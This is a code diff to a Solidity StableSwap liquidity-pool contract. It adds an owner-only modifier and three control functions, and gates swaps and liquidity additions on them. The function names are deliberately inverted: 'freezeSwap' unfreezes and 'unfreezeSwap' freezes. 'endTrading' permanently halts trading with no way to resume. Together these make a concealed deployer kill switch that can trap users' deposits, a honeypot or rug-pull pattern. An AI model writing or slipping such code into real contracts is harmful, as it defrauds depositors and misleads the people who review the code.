@@ -37,13 +37,36 @@ contract StableSwap {
     uint256 public totalSupply;
     mapping(address => uint256) public balanceOf;
 
+    address owner;
+    bool tradingActive = true;
+    bool freeze = false;
+
     constructor(address[N] memory _tokens) {
         tokens = _tokens;
+        owner = msg.sender;
     }
 
     function _mint(address _to, uint256 _amount) private {
         balanceOf[_to] += _amount;
         totalSupply += _amount;
+    }
+
+    modifier onlyManager() {
+        require(msg.sender == owner, "You are not the pool deployer");
+        _;
+    }
+
+    function freezeSwap() public onlyManager(){
+        freeze = false;
+    }
+
+    function endTrading() public onlyManager(){
+        tradingActive = false;
+    }
+
+    function unfreezeSwap() public onlyManager(){
+        require(freeze == false, "The contract is not frozen");
+        freeze = true;
     }
 
     function _burn(address _from, uint256 _amount) private {
@@ -238,6 +261,8 @@ contract StableSwap {
         external
         returns (uint256 dy)
     {
+        require(tradingActive == true, "Trading is not active");
+        require(freeze == false, "Swap is frozen temporarily");
         require(i != j, "i = j");
         require(dx <= IERC20(tokens[j]).balanceOf(address(this)), "Amount more than liquidity");
 
@@ -268,6 +293,7 @@ contract StableSwap {
         public
         returns (uint256)
     {
+        require(tradingActive == true, "Trading is not active");
         uint256 shares;
         // calculate current liquidity d0
         uint256 _totalSupply = totalSupply;
